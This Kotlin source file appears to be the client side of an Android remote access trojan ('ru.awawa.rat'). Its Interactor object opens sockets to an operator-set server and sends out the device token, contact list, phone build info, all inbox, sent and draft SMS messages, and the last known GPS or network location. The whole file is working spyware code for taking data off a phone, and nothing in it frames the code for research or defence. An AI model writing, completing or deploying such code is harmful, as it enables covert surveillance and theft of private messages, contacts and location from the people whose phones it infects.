package ru.awawa.rat.server

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.LocationManager
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.ActivityCompat
import io.ktor.network.selector.*
import io.ktor.network.sockets.*
import io.ktor.utils.io.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import ru.awawa.rat.Application
import ru.awawa.rat.helper.BuildInfo
import ru.awawa.rat.helper.ContactsHelper
import ru.awawa.rat.helper.Preferences
import ru.awawa.rat.helper.SmsHelper
import java.io.*
import java.net.InetSocketAddress
import java.net.Socket
import java.net.SocketException
import java.util.logging.Logger

object Interactor {

    private const val TAG = "Interactor"

    private var serverIp = Preferences.get<String>(Preferences.PreferencesField.IP)
    private var serverPort = Preferences.get<Int>(Preferences.PreferencesField.PORT) ?: 33455

    private const val dataDivider = ":|:"

    fun init(ip: String = "", port: Int = -1) {
        serverIp = ip.ifBlank { Preferences.get<String>(Preferences.PreferencesField.IP) }
        serverPort = if (port == -1) Preferences.get(Preferences.PreferencesField.PORT) ?: 33455 else port
    }

    fun sendToken() {

        GlobalScope.launch(Dispatchers.IO) {

            val socket = Socket()
            socket.connect(InetSocketAddress(serverIp, serverPort))

            val output = socket.getOutputStream()
            val input = socket.getInputStream().bufferedReader()

            val token = Preferences.get<String>(Preferences.PreferencesField.TOKEN) ?: ""
            val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""

            val dataToSend = "connect${dataDivider}$uuid${dataDivider}$token\n".toByteArray()
            Log.d(TAG, "Sending $dataToSend")
            output.write(dataToSend)

            Log.d(TAG, "Waiting fo response")
            val result = input.readLine().split(dataDivider)

            if (result[0] == "ok") {
                val newUuid = result[1]
                Preferences.set(Preferences.PreferencesField.UUID, newUuid)
            } else {
                val errorMessage = result.getOrElse(1) { "" }
                Log.e(TAG, "Connect failed: $errorMessage")
            }
            Log.d(TAG, "Received $result")

            socket.close()
        }
    }

    fun sendContacts() {
        GlobalScope.launch(Dispatchers.IO) {
            val socket = Socket()
            socket.connect(InetSocketAddress(serverIp, serverPort))

            val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""
            val contacts = ContactsHelper.getContacts(Application.context)
            socket.getOutputStream().write("contacts${dataDivider}$uuid${dataDivider}$contacts\n".toByteArray())
            Log.w(TAG, "Sent: contacts:|:$uuid:|:$contacts")

            val result = socket.getInputStream().bufferedReader().readLine().split(dataDivider)
            Log.d(TAG, "Answer: $result")

            if (result[0] != "ok") {
                val error = result.getOrElse(1) { "" }
                Log.e(TAG, "Contacts sending failed: $error")
            }

            socket.close()
        }
    }

    fun sendPhoneInfo() {
        GlobalScope.launch(Dispatchers.IO) {
            val socket = Socket()
            socket.connect(InetSocketAddress(serverIp, serverPort))

            val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""
            val info = BuildInfo.getInfo()
            socket.getOutputStream().write("phone_info${dataDivider}$uuid${dataDivider}$info\n".toByteArray())

            val result = socket.getInputStream().bufferedReader().readLine().split(dataDivider)

            if (result[0] != "ok") {
                val error = result.getOrElse(1) { "" }
                Log.e(TAG, "Phone info sending failed: $error")
            }

            socket.close()
        }
    }

    fun sendSms() {
        GlobalScope.launch(Dispatchers.IO) {
            val socket = Socket()
            socket.connect(InetSocketAddress(serverIp, serverPort))

            val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""

            var toSend = "sms${dataDivider}$uuid\n"
            val inbox = SmsHelper.readInbox(Application.context).joinToString("\n") { it }
            toSend += "INBOX:\n$inbox\n"

            val sent = SmsHelper.readSent(Application.context).joinToString("\n") { it }
            toSend += "SENT:\n$sent\n"

            val draft = SmsHelper.readDraft(Application.context).joinToString("\n") { it }
            toSend += "DRAFT:\n$draft\n"

            socket.getOutputStream().write(toSend.toByteArray())
            val result = socket.getInputStream().bufferedReader().readLine().split(dataDivider)

            if (result[0] != "ok") {
                val error = result.getOrElse(1) { "" }
                Log.e(TAG, "SMS sending failed: $error")
            }

            socket.close()
        }
    }

    fun sendLocation() {
        GlobalScope.launch(Dispatchers.IO) {
            val socket = Socket()
            socket.connect(InetSocketAddress(serverIp, serverPort))

            val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""

            val locationManager = Application.context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager?
            val lastLocation = if (ActivityCompat.checkSelfPermission(
                    Application.context,
                    Manifest.permission.ACCESS_FINE_LOCATION
                ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                    Application.context,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                "Unknown"
            } else {
                val l = locationManager?.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                    ?: locationManager?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                "Longitude: ${l?.longitude} Latitude: ${l?.latitude}"
            }

            socket.getOutputStream().write(
                "location${dataDivider}$uuid${dataDivider}$lastLocation\n".toByteArray()
            )
            val result = socket.getInputStream().bufferedReader().readLine().split(dataDivider)

            if (result[0] != "ok") {
                val error = result.getOrElse(1) { "" }
                Log.e(TAG, "Location sending failed: $error")
            }

            socket.close()
        }
    }
}